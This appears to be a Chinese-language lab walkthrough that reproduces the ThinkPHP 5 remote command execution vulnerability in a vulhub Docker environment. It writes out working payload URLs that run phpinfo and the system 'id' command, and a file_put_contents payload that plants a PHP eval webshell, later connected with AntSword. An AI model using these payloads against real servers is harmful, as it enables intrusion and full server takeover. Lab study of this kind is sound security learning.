## 一、 准备工作

复现此漏洞需要安装docker，下载安装docker-compose，搭建vulhub靶场，保证攻击机与靶机之间的网络互通。

## 二、 漏洞介绍

>
> ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下可执行任意方法，从而导致远程命令执行漏洞。

## 三、 影响版本：

> 包括5.0.23和5.1.31之前的所有版本

## 四、 复现过程

先cd到目录下启动漏洞环境

docker-compose up -d

![1653459640_628dcab84268c2aa08cf5.png!small?1653459642128](https://image.3001.net/images/20220525/1653459640_628dcab84268c2aa08cf5.png!small?1653459642128)

然后我们输入docker ps查看一下服务起到哪个端口

![1653459661_628dcacd49b29a6b556ff.png!small?1653459663119](https://image.3001.net/images/20220525/1653459661_628dcacd49b29a6b556ff.png!small?1653459663119)

访问<http://youIP:8080>看到thinkphp默认启动页说明环境正常。

![1653459690_628dcaea5b008ef37ca55.png!small?1653459692210](https://image.3001.net/images/20220525/1653459690_628dcaea5b008ef37ca55.png!small?1653459692210)

使用payload即可看到执行了phpinfo：

[http://yourIP:port/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1](http://yourIP/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=-1)

![1653459731_628dcb13e3f33348fcca9.png!small?1653459734070](https://image.3001.net/images/20220525/1653459731_628dcb13e3f33348fcca9.png!small?1653459734070)

  

 **执行命令Payload的URL组成**

[http://192.168.163.130:8080/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id](http://192.168.163.130:8080/?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id)

  

  1. [http://yourIP:port/index.php](http://yourIP/index.php)//主页
  2. ?s=/Index/\think\app/invokefunction // s变量是这个漏洞利用的主要变量
  3. &function=call_user_func_array //漏洞存在于这个函数中
  4. &vars[0]=system //使用system函数执行命令
  5. &vars[1][]=id //要执行的命令，这里执行的是id命令

  

  

执行效果：

http://192.168.163.130:8080/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

利用了system函数执行命令id：

![1653459836_628dcb7cd3749296273e6.png!small?1653459838706](https://image.3001.net/images/20220525/1653459836_628dcb7cd3749296273e6.png!small?1653459838706)

## 五、 GetShell

我们构造URL：

http://youIP:port/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1.php&vars[1][]=<?php
@eval($_POST['1qaz']);?>

 **file_put_contents //使用file_put_contents函数实现写入webshell**

注意要用POST

写入一个1.php的一句话木马，回显30代表成功了；

![1653459901_628dcbbdb5ef6a77e120b.png!small?1653459903601](https://image.3001.net/images/20220525/1653459901_628dcbbdb5ef6a77e120b.png!small?1653459903601)

进入容器查看一下，文件会被写入到public目录中：

![1653459910_628dcbc6a396287b318c9.png!small?1653459912582](https://image.3001.net/images/20220525/1653459910_628dcbc6a396287b318c9.png!small?1653459912582)

用蚁剑连接一下getshell

![1653459922_628dcbd269c2cf7044fa4.png!small?1653459924286](https://image.3001.net/images/20220525/1653459922_628dcbd269c2cf7044fa4.png!small?1653459924286)

![1653459934_628dcbded1166437578eb.png!small?1653459936690](https://image.3001.net/images/20220525/1653459934_628dcbded1166437578eb.png!small?1653459936690)

